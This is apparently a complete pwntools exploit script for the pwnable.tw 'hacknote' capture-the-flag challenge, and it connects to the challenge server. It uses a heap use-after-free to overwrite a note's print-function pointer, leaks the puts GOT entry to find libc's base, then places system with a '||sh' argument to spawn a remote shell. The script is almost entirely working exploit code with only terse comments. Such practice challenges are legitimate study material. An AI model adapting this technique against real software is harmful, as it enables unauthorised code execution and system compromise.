#!/usr/bin/env python
from pwn import *

context.log_level='debug'
debug=0
if debug:
    p=process('./hacknote',env={'LD_PRELOAD':'./libc_32.so.6'})
else:
    p=remote('chall.pwnable.tw',10102)

def send(s):
    p.send(s)

def sendline(s):
    p.sendline(s)

def new(size,content):
    p.recvuntil(':')
    p.sendline('1')
    p.recvuntil(':')
    p.sendline(str(size))
    p.recvuntil(':')
    p.send(content)
    sleep(0.1)

def delete(index):
    p.recvuntil(':')
    p.sendline('2')
    p.recvuntil(':')
    p.sendline(str(index))
    
def show(index):
    p.recvuntil(':')
    p.sendline('3')
    p.recvuntil(':')
    p.sendline(str(index))


new(0x20,'/bin/sh\x00')                         # 0          note0 content0
new(0x20,'/bin/sh\x00')                         # 1          note1 content1 
new(0x20,'/bin/sh\x00')                         # 2
 
delete(0)                                      
delete(1)

new(0x8,p32(0x0804862b)+p32(0x804a024))        # 3: note 1 (note) --> note0 (content) 
                                               # note0: puts puts_got
                                               # note1: puts note0_ptr     
show(0)
puts_libc=u32(p.recvuntil('1. ')[0:4])

system=puts_libc-0x5f140+0x3a940
str_bin_sh=puts_libc-0x5f140+0x158e8b
libc_base=puts_libc-0x5f140
'''
libc_base=puts_libc-392352
system=libc_base+241056
str_bin_sh=libc_base+0x15ba0b
'''

print(hex(libc_base))
print(hex(system))
print(hex(str_bin_sh))

delete(3)                                   # delete 3

one_off=0x3a819
#one_off=0x5f065
#one_off=0x5f066
one=libc_base+one_off

new(0x8,p32(system)+'||sh')

print(hex(one))
show(0)

p.interactive()






